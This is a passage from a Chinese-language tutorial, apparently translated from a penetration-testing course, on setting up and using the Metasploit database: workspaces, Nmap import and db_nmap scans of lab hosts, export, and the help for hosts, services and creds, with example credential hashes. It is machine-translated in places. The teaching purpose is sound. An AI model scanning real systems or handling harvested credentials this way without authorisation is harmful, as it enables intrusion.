/usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con</span><br><span class="line"></span><br><span class="line">[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)</span><br></pre></td></tr></table></figure>

<p>如果这个错误没有出现，这通常发生在全新安装 Metasploit 之后，那么我们将在初始化数据库时看到以下内容：</p>
<p> MSF - 启动数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[+] Starting database</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br></pre></td></tr></table></figure>

<p>数据库初始化完成后，我们可以<code>msfconsole</code>同时启动并连接到创建的数据库。</p>
<h4 id="MSF-连接到启动的数据库"><a href="#MSF-连接到启动的数据库" class="headerlink" title="MSF - 连接到启动的数据库"></a>MSF - 连接到启动的数据库</h4><p> MSF - 连接到启动的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb run</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">                                                  </span><br><span class="line">         .                                         .</span><br><span class="line"> .</span><br><span class="line"></span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o</span><br><span class="line">       &#x27;   dB&#x27;                     BBP</span><br><span class="line">    dB&#x27;dB&#x27;dB&#x27; dBBP     dBP     dBP BB</span><br><span class="line">   dB&#x27;dB&#x27;dB&#x27; dBP      dBP     dBP  BB</span><br><span class="line">  dB&#x27;dB&#x27;dB&#x27; dBBBBP   dBP     dBBBBBBB</span><br><span class="line"></span><br><span class="line">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP</span><br><span class="line">          .                  .                  dB&#x27; dBP    dB&#x27;.BP</span><br><span class="line">                             |       dBP    dBBBB&#x27; dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                           --o--    dBP    dBP    dBP    dB&#x27;.BP dBP    dBP</span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP</span><br><span class="line"></span><br><span class="line">                                                                    .</span><br><span class="line">                .</span><br><span class="line">        o                  To boldly go where no</span><br><span class="line">                            shell has gone before</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.39-dev                          ]</span><br><span class="line">+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]</span><br><span class="line">+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf6&gt;</span><br></pre></td></tr></table></figure>

<p>但是，如果我们已经配置了数据库并且无法将密码更改为 MSF 用户名，请继续执行以下命令：</p>
<h4 id="MSF-重新启动数据库"><a href="#MSF-重新启动数据库" class="headerlink" title="MSF - 重新启动数据库"></a>MSF - 重新启动数据库</h4><p> MSF - 重新启动数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfdb reinit</span><br><span class="line">vnswer77@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/</span><br><span class="line">vnswer77@htb[/htb]$ sudo service postgresql restart</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: PostgreSQL.</span><br></pre></td></tr></table></figure>

<p>现在，我们可以开始了。它还<code>msfconsole</code>为数据库提供集成帮助。这为我们提供了与数据库交互和使用数据库的良好概述。</p>
<h4 id="MSF-数据库选项"><a href="#MSF-数据库选项" class="headerlink" title="MSF - 数据库选项"></a>MSF - 数据库选项</h4><p> MSF - 数据库选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help database</span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h2><p>在数据库的帮助下，我们可以管理我们分析过的许多不同的类别和主机。或者，我们使用 Metasploit 与之交互的有关它们的信息。这些数据库可以导出和导入。当我们有大量的主机列表、战利品、注释和这些主机的存储漏洞时，这尤其有用。确认数据库连接成功后，我们就可以组织我们的<code>Workspaces</code>.</p>
<h4 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h4><p>我们可以<code>Workspaces</code>像考虑项目中的文件夹一样考虑。我们可以按 IP、子网、网络或域隔离不同的扫描结果、主机和提取的信息。</p>
<p>要查看当前工作区列表，请使用<code>workspace</code>命令。在命令后添加<code>-a</code>or开关，后跟工作空间的名称，将把工作空间或该工作空间添加到数据库中。<code>-d``add``delete</code></p>
<p> 工作区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">* default</span><br></pre></td></tr></table></figure>

<p>请注意，默认工作区已<code>default</code>根据<code>*</code>符号命名并且当前正在使用中。键入<code>workspace [name]</code>命令以切换当前使用的工作区。回顾我们的示例，让我们为此评估创建一个工作区并选择它。</p>
<p> 工作区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -a Target_1</span><br><span class="line"></span><br><span class="line">[*] Added workspace: Target_1</span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace Target_1 </span><br><span class="line"></span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">  default</span><br><span class="line">* Target_1</span><br></pre></td></tr></table></figure>

<p>要查看我们还可以使用 Workspaces 做什么，我们可以使用<code>workspace -h</code>与 Workspaces 相关的帮助菜单的命令。</p>
<p> 工作区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r     Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="导入扫描结果"><a href="#导入扫描结果" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h2><p>接下来，让我们假设我们想要将<code>Nmap scan</code>主机的一个导入到我们的数据库的工作区中，以便更好地了解目标。我们可以<code>db_import</code>为此使用命令。导入完成后，我们可以使用<code>hosts</code>和<code>services</code>命令检查数据库中主机信息的存在。请注意，<code>.xml</code>文件类型首选<code>db_import</code>.</p>
<h4 id="存储-Nmap-扫描"><a href="#存储-Nmap-扫描" class="headerlink" title="存储 Nmap 扫描"></a>存储 Nmap 扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat Target.nmap</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds</span><br></pre></td></tr></table></figure>

<h4 id="导入扫描结果-1"><a href="#导入扫描结果-1" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_import Target.xml</span><br><span class="line"></span><br><span class="line">[*] Importing &#x27;Nmap XML&#x27; data</span><br><span class="line">[*] Import: Parsing with &#x27;Nokogiri v1.10.9&#x27;</span><br><span class="line">[*] Importing host 10.10.10.40</span><br><span class="line">[*] Successfully imported ~/Target.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h2 id="在-MSF-控制台中使用-Nmap"><a href="#在-MSF-控制台中使用-Nmap" class="headerlink" title="在 MSF 控制台中使用 Nmap"></a>在 MSF 控制台中使用 Nmap</h2><p>或者，我们可以直接从 msfconsole 使用 Nmap！要直接从控制台扫描而无需后台或退出进程，请使用命令<code>db_nmap</code>。</p>
<h4 id="无国界医生-Nmap"><a href="#无国界医生-Nmap" class="headerlink" title="无国界医生-Nmap"></a>无国界医生-Nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -sS 10.10.10.8</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.8</span><br><span class="line">[*] Nmap: Host is up (0.016s latency).</span><br><span class="line">[*] Nmap: Not shown: 999 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ </span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.8              Unknown                    device         </span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>会话结束后，如果 PostgreSQL 服务出现任何问题，请务必备份我们的数据。为此，请使用<code>db_export</code>命令。</p>
<h4 id="MSF-数据库导出"><a href="#MSF-数据库导出" class="headerlink" title="MSF - 数据库导出"></a>MSF - 数据库导出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_export -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br><span class="line">[-] No output file was specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_export -f xml backup.xml</span><br><span class="line"></span><br><span class="line">[*] Starting export of workspace default to backup.xml [ xml ]...</span><br><span class="line">[*] Finished export of workspace default to backup.xml [ xml ]...</span><br></pre></td></tr></table></figure>

<p>以后需要时可以将此数据导回 msfconsole。<code>hosts</code>其他与数据保留相关的命令是、<code>services</code>、<code>creds</code>和命令的扩展使用<code>loot</code>。</p>
<h2 id="主持"><a href="#主持" class="headerlink" title="主持"></a>主持</h2><p>该<code>hosts</code>命令显示一个数据库表，该表自动填充了主机地址、主机名以及我们在扫描和交互过程中找到的有关这些信息的其他信息。例如，假设<code>msfconsole</code>与可以执行服务和操作系统检测的扫描仪插件链接。在这种情况下，一旦通过 msfconsole 完成扫描，该信息就会自动出现在表中。同样，Nessus、NexPose 或 Nmap 等工具将在这些情况下为我们提供帮助。</p>
<p>主机也可以手动添加为该表中的单独条目。添加我们的自定义主机后，我们还可以组织表格的格式和结构、添加评论、更改现有信息等等。</p>
<h4 id="MSF-存储主机"><a href="#MSF-存储主机" class="headerlink" title="MSF - 存储主机"></a>MSF - 存储主机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; hosts -h</span><br><span class="line"></span><br><span class="line">Usage: hosts [ options ] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -a,--add          Add the hosts instead of searching</span><br><span class="line">  -d,--delete       Delete the hosts instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns (see list below)</span><br><span class="line">  -C &lt;col1,col2&gt;    Only show the given columns until the next restart (see list below)</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -u,--up           Only show hosts which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in CSV format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -i,--info         Change the info of a host</span><br><span class="line">  -n,--name         Change the name of a host</span><br><span class="line">  -m,--comment      Change the comment of a host</span><br><span class="line">  -t,--tag          Add or specify a tag to a range of hosts</span><br><span class="line"></span><br><span class="line">Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span><br></pre></td></tr></table></figure>

<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>该<code>services</code>命令的功能与前一个命令相同。它包含一个表格，其中包含有关在扫描或交互过程中发现的服务的描述和信息。与上面的命令一样，这里的条目是高度可定制的。</p>
<h4 id="MSF-主机的存储服务"><a href="#MSF-主机的存储服务" class="headerlink" title="MSF - 主机的存储服务"></a>MSF - 主机的存储服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; services -h</span><br><span class="line"></span><br><span class="line">Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add the services instead of searching</span><br><span class="line">  -d,--delete       Delete the services instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -s &lt;name&gt;         Name of the service to add</span><br><span class="line">  -p &lt;port&gt;         Search for a list of ports</span><br><span class="line">  -r &lt;protocol&gt;     Protocol type of the service being added [tcp|udp]</span><br><span class="line">  -u,--up           Only show services which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in csv format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -U,--update       Update data for existing service</span><br><span class="line"></span><br><span class="line">Available columns: created_at, info, name, port, proto, state, updated_at</span><br></pre></td></tr></table></figure>

<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>该<code>creds</code>命令允许您可视化在与目标主机交互期间收集的凭据。我们还可以手动添加凭据，将现有凭据与端口规范匹配，添加描述等。</p>
<h4 id="MSF-存储凭证"><a href="#MSF-存储凭证" class="headerlink" title="MSF - 存储凭证"></a>MSF - 存储凭证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; creds -h</span><br><span class="line"></span><br><span class="line">With no sub-command, list credentials. If an address range is</span><br><span class="line">given, show only credentials with logins on hosts within that</span><br><span class="line">range.</span><br><span class="line"></span><br><span class="line">Usage - Listing credentials:</span><br><span class="line">  creds [filter options] [address range]</span><br><span class="line"></span><br><span class="line">Usage - Adding credentials:</span><br><span class="line">  creds add uses the following named parameters.</span><br><span class="line">    user      :  Public, usually a username</span><br><span class="line">    password  :  Private, private_type Password.</span><br><span class="line">    ntlm      :  Private, private_type NTLM Hash.</span><br><span class="line">    Postgres  :  Private, private_type Postgres MD5</span><br><span class="line">    ssh-key   :  Private, private_type SSH key, must be a file path.</span><br><span class="line">    hash      :  Private, private_type Nonreplayable hash</span><br><span class="line">    jtr       :  Private, private_type John the Ripper hash type.</span><br><span class="line">    realm     :  Realm, </span><br><span class="line">    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.</span><br><span class="line"></span><br><span class="line">Examples: Adding</span><br><span class="line">   # Add a user, password and realm</span><br><span class="line">   creds add user:admin password:notpassword realm:workgroup</span><br><span class="line">   # Add a user and password</span><br><span class="line">   creds add user:guest password:&#x27;guest password&#x27;</span><br><span class="line">   # Add a password</span><br><span class="line">   creds add password:&#x27;password without username&#x27;</span><br><span class="line">   # Add a user with an NTLMHash</span><br><span class="line">   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a NTLMHash</span><br><span class="line">   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a Postgres MD5</span><br><span class="line">   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860</span><br><span class="line">   # Add a user with an SSH key</span><br><span class="line">   creds add user:sshadmin ssh-key:/path/to/id_rsa</span><br><span class="line">   # Add a user and a NonReplayableHash</span><br><span class="line">   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5</span><br><span class="line">   # Add a 